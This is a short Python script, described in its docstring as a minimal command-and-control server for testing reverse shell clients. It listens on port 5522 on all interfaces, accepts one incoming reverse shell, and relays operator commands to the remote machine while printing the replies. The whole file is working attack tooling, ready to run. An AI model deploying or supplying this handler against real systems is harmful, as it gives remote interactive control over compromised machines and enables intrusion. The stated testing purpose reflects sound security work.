"""Minimal C2 server for testing reverse shell clients."""
import socket
import subprocess

def run_c2_server(port=5522):
    """Accept reverse shell connection and receive interactive shell output."""

    # Create server socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)

    print(f"[C2] Listening on 0.0.0.0:{port}")
    print("[C2] Waiting for reverse shell connection...\n")

    # Accept connection
    conn, addr = server.accept()
    print(f"[C2] ✓ Connection received from {addr[0]}:{addr[1]}")
    print("[C2] You now have an interactive shell. Type 'exit' to quit.\n")

    try:
        while True:
            # Get user input
            try:
                cmd = input(">>> ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n[C2] Exiting...")
                break

            if not cmd:
                continue

            # Send command to reverse shell
            try:
                conn.sendall((cmd + "\n").encode())
                print(f"[C2] Sent: {cmd}")
            except OSError as e:
                print(f"[C2] ERROR sending: {e}")
                break

            # Receive output from shell
            try:
                output = conn.recv(4096)
                if output:
                    print(output.decode("utf-8", "replace"), end="")
                else:
                    print("[C2] Connection closed by remote")
                    break
            except OSError as e:
                print(f"[C2] ERROR receiving: {e}")
                break

    finally:
        conn.close()
        server.close()
        print("[C2] Server closed")

if __name__ == "__main__":
    run_c2_server(port=5522)
